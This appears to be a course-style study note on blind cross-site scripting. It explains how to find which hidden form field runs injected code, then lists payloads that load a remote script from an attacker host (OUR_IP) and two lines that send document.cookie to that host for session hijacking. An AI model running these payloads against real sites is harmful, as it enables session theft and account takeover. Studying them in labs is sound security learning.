
We usually start XSS attacks by trying to discover if and where and [[XSS]] vulnerability occurs when the vuln is triggered on a page we don't have access to.

[[Blind XSS]] vulnerabilities usually occur with forms only accessible to certain users, admins for example. 
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

*How can we know which specific field is vulnerable?* Since any of the fields may execute our code, we can't know which of them did.

*How can we know what XSS payload to use?* Since the page may be vulnerable, but the payload may not work.

## Loading a Remote Script

In HTML we can write JS code within the `<script>` tags, but we can also include a remote script by providing its URL, as follows:

```html
<script src="http://OUR_IP/script.js"></script>
```

So, we can use this to execute a remote JS file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script.

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Various payloads start with an injection like `'>` which may or may not work depending on how our input is handled in the [[Back end]].

## Session Hijacking
Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a [[Session Hijacking]] attack.
It requires a JS payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
